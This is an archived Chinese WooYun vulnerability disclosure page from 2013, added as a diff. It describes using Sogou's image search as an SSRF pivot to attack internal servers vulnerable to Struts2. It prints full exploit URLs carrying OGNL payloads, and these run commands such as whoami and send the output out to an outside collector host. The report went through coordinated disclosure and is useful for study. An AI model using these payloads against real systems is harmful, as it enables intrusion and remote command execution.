@@ -1,0 +1,214 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		通过搜狗某搜索功能扫描搜狗内网（续）之攻击内网struts2漏洞主机  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		通过搜狗某搜索功能扫描搜狗内网（续）之攻击内网struts2漏洞主机  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/lupin">lupin</a> 
+</li><li>提交时间：		2013-10-30 18:05</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-30：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-01：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-11：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-11-21：	细节向普通白帽子公开<br/>
+									2013-12-01：	细节向实习白帽子公开<br/>
+									2013-12-14：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">通过搜狗正常对外搜索服务，攻击搜狗内网存在struts2漏洞的服务器。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">几天发布了搜狗的这个漏洞： <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-041264">WooYun: 通过搜狗某搜索功能扫描搜狗内网</a> <br />
+<br />
+通过搜索图片功能可以访问到内网服务器，这次利用这个漏洞作为跳板攻击到了搜狗内部存在struts2漏洞的服务器。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">在上次提到的漏洞中（ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-041264">WooYun: 通过搜狗某搜索功能扫描搜狗内网</a> ），使用图片搜索功能成功判断到了搜狗内部服务器的开放情况，搜集到了大量的服务器ip：<br />
+<br />
+</p><p class="detail"><a href="../images/3017472526886d65cee656561dca31bc4077f672.jpg" target="_blank"><img src="../images/3017472526886d65cee656561dca31bc4077f672.jpg" alt="sg4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+本来觉得除了扫描开放的服务器之外这个应该没有什么其他的利用价值了，不过仔细思考了一番，既然可以通过这个功能访问内网web服务器，那么如果发送一个代用攻击指令的url到了特定的内网服务器上，这个服务器恰好有漏洞，那么是不是就可以用这个搜索功能作为跳板攻击到搜狗内网了呢？<br />
+<br />
+那么什么url具有攻击性呢？这里只能提交url，也就是说只能是get请求，于是我想到了前段时间闹得很凶的struts2命令执行漏洞，于是构造下面这样的url：<br />
+<br />
+http://pic.sogou.com/ris?query=http%3A%2F%2F192.168.x.x%3A80%2Findex.action%3Fredirect%3A%24%7Bnew%2520java.net.URL%28%27http%3A%2F%2F1.1.1.1%3A80%2Fo.jsp%3F192.168.x.x%27%29.openConnection%28%29.getInputStream%28%29%7D<br />
+<br />
+<br />
+<br />
+解释一下，因为服务器在内网，而且又是通过这个搜索功能作为跳板，那么我就无法直接看到命令是否执行所以，通过java构造一个http请求，让他把信息get到我远程的jsp文件上去（http://1.1.1.1/o.jsp）,返回的信息就是内网服务器的ip地址。<br />
+<br />
+还是用程序跑：<br />
+<br />
+</p><p class="detail"><a href="../images/3017443151c5e143cbef1665ec3602f9f9e04d50.jpg" target="_blank"><img src="../images/3017443151c5e143cbef1665ec3602f9f9e04d50.jpg" alt="sg.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+尝试了login.action、index.action，跑了半天没结果，后来想了一下，struts2官网提供过几个示例程序，很多开发人员都把他们部署在服务器上做参考，其中最简单的一个叫struts-blank，就是一个struts2框架的helloworld，于是构造类似这样的url，再跑一次：<br />
+<br />
+http://pic.sogou.com/ris?query=http%3A%2F%2F192.168.x.x%3A8080%2Fstruts2-blank%2Findex.action%3Fredirect%3A%24%7Bnew%2520java.net.URL%28%27http%3A%2F%2F1.1.1.1%3A80%2Fo.jsp%3F192.168.x.x%27%29.openConnection%28%29.getInputStream%28%29%7D<br />
+<br />
+<br />
+<br />
+这次太幸运了，远程的o.jsp成功获得了一个ip地址：<br />
+<br />
+</p><p class="detail"><a href="../images/301744507bcdb8e334239201b95bbf391ac6017d.jpg" target="_blank"><img src="../images/301744507bcdb8e334239201b95bbf391ac6017d.jpg" alt="sg1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+接下来的事情就是针对这个ip构造执行命令的poc了，url如下：<br />
+<br />
+http://pic.sogou.com/ris?query=http%3A%2F%2F192.168.x.x%3A8080%2Fstruts2-blank%2Findex.action%3Fredirect%3A%24%7Bnew%2520java.net.URL%28%27http%3A%2F%2F1.1.1.1%3A80%2Fo.jsp%3F%27%252Bnew+java.io.BufferedReader%28new+java.io.InputStreamReader%28new+java.lang.ProcessBuilder%28%7B%27whoami%27%7D%29.start%28%29.getInputStream%28%29%29%29.readLine%28%29%29.openConnection%28%29.getInputStream%28%29%7D<br />
+<br />
+就是通过struts2漏洞执行whoami命令，结果o.jsp上收到了命令执行结果：<br />
+<br />
+</p><p class="detail"><a href="../images/30174505a2dc36ddf73e64ec0cb5d1a7b3928216.jpg" target="_blank"><img src="../images/30174505a2dc36ddf73e64ec0cb5d1a7b3928216.jpg" alt="sg2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+执行pwd：<br />
+<br />
+</p><p class="detail"><a href="../images/3017452771f99ad4cab62bcb311211a19ad2b9b3.jpg" target="_blank"><img src="../images/3017452771f99ad4cab62bcb311211a19ad2b9b3.jpg" alt="sg3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+如果再变换一些action名称的话，估计还能找到一些存在漏洞的服务器，这里就不搞了，申请奖品啊。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">赶紧把图片搜索功能做好访问控制吧，并且内网服务器里面的struts2漏洞也不是说外部利用不到，赶紧升级吧。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/lupin" title="lupin">lupin</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-041495" title="通过搜狗某搜索功能扫描搜狗内网（续）之攻击内网struts2漏洞主机">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-11-01 10:52</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提供</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="41495";
+var bugRating="2";
+var myRating="";
+var ratingCount="6";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
